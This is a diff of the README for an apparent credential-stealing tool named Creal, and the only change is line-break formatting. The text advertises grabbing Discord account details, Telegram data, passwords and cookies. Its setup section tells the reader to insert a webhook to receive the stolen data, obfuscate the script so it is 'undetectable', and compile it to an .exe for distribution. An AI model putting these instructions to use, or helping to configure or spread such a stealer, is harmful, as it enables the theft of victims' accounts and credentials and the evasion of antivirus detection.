@@ -3,19 +3,19 @@
 
 
 ## Features:
-» Grab Discord Information and HQ Friends.
-» Grab Telegram
-» Grab Password & cookies
+» Grab Discord Information and HQ Friends.\
+» Grab Telegram\
+» Grab Password & cookies\
 
 
 ## Setup:
  
-First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
-If you use obfuscator it will be undetectable.
-Now You need to use pyinstaller to convert python file to exe.
-Open CMD and type `pip install auto_py_to_exe`
-and after installed `python -m auto_py_to_exe`
-Browse file and press covert .py .exe
+First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py\
+If you use obfuscator it will be undetectable.\
+Now You need to use pyinstaller to convert python file to exe.\
+Open CMD and type `pip install auto_py_to_exe`\
+and after installed `python -m auto_py_to_exe`\
+Browse file and press covert .py .exe\
  
  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
